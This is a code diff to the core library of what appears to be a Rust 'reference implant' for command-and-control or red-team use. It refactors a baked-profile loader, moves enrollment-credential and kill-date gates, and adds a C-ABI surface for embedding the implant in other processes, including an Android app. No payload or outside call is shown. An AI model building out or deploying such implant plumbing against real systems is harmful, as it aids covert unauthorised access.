@@ -1,8 +1,10 @@
 // The Rust reference implant's library core (architecture.md Sec 12.2).
-// The whole machine lives here so it has two entries that share it: the
-// standalone process (src/main.rs, the desktop legs) and the Android
-// carrier shell (carrier/, the cdylib android.app.NativeActivity loads
-// in-process). One core, two shells, no protocol knowledge in either.
+// The whole machine lives here so it has three entries that share it: the
+// standalone process (src/main.rs, the desktop legs), the Android carrier
+// shell (carrier/, the cdylib android.app.NativeActivity loads in-process),
+// and the C-ABI embedding surface (ffi.rs, the linkable core a non-Rust
+// shell drives through a handful of rod_core_* symbols). One core, three
+// shells, no protocol knowledge in any of them.
 
 mod baked;
 mod channel;
@@ -22,35 +24,25 @@ mod trust;
 mod verify;
 mod wire;
 
-// The gates both entries share: load the profile (the fielded shape runs
-// entirely off the bake; the dev shape, an empty bake, runs from ROD_*
-// environment variables), refuse an empty credential and a passed kill
-// date. Split from the entries because a library loaded into another
-// process must never exit it -- the caller decides what an end state means.
-fn runnable_profile() -> Option<profile::Profile> {
-    let Some(profile) =
-        profile::Profile::from_baked(baked::PROFILE).or_else(profile::Profile::from_env)
-    else {
-        crate::diag!(
-            "this build carries no baked profile and no ROD_* environment; nothing to run"
-        );
-        return None;
-    };
-    if profile.token.is_empty() {
-        crate::diag!("no enrollment credential (bake or ROD_DEPLOY_TOKEN)");
-        return None;
-    }
-    if profile.kill_date_passed() {
-        crate::diag!("kill date has passed; refusing to run");
-        return None;
-    }
-    Some(profile)
+pub mod ffi;
+
+// The profile both in-tree entries load: the fielded shape runs entirely
+// off the bake; the dev shape, an empty bake, runs from ROD_* environment
+// variables. The credential and kill-date gates live in the machine
+// (run::Machine::new), shared by every entry -- a library loaded into
+// another process must never exit it; the caller decides what an end state
+// means.
+fn load_profile() -> Option<profile::Profile> {
+    profile::Profile::from_baked(baked::PROFILE).or_else(profile::Profile::from_env)
 }
 
 /// The standalone process entry's answer: the exit code the binary maps
 /// onto `std::process::exit`.
 pub fn standalone_main() -> i32 {
-    let Some(profile) = runnable_profile() else {
+    let Some(profile) = load_profile() else {
+        crate::diag!(
+            "this build carries no baked profile and no ROD_* environment; nothing to run"
+        );
         return 2;
     };
     match run::run(&profile) {
@@ -64,7 +56,10 @@ pub fn standalone_main() -> i32 {
 /// Android activity, say) owns the process lifetime and may restart the
 /// loop by launching the carrier again.
 pub fn carrier_run() {
-    let Some(profile) = runnable_profile() else {
+    let Some(profile) = load_profile() else {
+        crate::diag!(
+            "this build carries no baked profile and no ROD_* environment; nothing to run"
+        );
         return;
     };
     match run::run(&profile) {
